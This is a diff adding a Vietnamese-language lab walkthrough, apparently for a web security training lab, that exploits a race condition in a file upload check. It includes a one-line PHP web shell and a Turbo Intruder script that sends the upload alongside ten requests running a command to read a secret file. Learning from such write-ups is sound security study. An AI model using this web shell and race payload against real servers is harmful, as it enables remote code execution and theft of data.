@@ -348,6 +348,60 @@ function checkFileType($fileName) {
   
 </details>
 
+\- Ta đã có phần logic xử lí việc file upload, nhìn vào source code:
+- File được gửi lên được lưu tạm bên trong thư mục `/files/avatars/<tên-file>`
+- Sau đó file được kiểm tra xem đây có phải file nguy hiểm hay không bằng 2 hàm `checkViruses` và `checkFileType`
+
+\- Kết hợp mới yêu cầu đề bài, đây là lỗ hổng file upload chain với race condition, do có một tích tắc file được tồn tại trên hệ thống, thậm chí server có thể đã thực thi file đó.
+
+\- Với dạng bài Race condition multi-endpoint &rarr; bắt buộc sử dụng Turbo Intruder
+
+\- Sửa file extension, nội dung của file thành hàm thực thi để khai thác RCE:
+```
+<?php system($_REQUEST['cmd']); ?>
+```
+
+\- Sử dụng payload `examples/race-multi-endpoint.py`:
+- Kéo request upload file ra bên ngoài vòng lặp
+- Thay `req1` thành `target.req` cho payload gọn, dễ hiểu (`target.req` chính là request tại nơi ta truy cập Turbo Intruder)
+- Sử dụng engine `Engine.BURP2`
+
+&rarr; Truy cập Turbo Intruder ở request upload file đã được sửa:
+
+<details>
+  <summary>Payload</summary>
+
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=1,    
+        engine=Engine.BURP2         
+    )
+    request2 = '''
+GET /files/avatars/a.php?cmd=cat+/home/carlos/secret HTTP/2
+Host: 0ac70016045610708330427e000f0061.web-security-academy.net
+Cookie: session=0NZopIWvoYiVcBze0x2PuItVIlDLhnRK
+'''
+
+    engine.queue(target.req, gate='race1') 
+    for x in range(10):
+        engine.queue(request2, gate='race1')
+
+    engine.openGate('race1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+```
+</details>
+
+&rarr; Khi này có 1 request upload file và 10 request fetch endpoint mà file được tải lên được gửi đi cùng lúc
+
+<img width="1905" height="755" alt="image" src="https://github.com/user-attachments/assets/26a3677f-e4ce-4245-bcfc-c8fba7528181" />
+
+
  
 
 
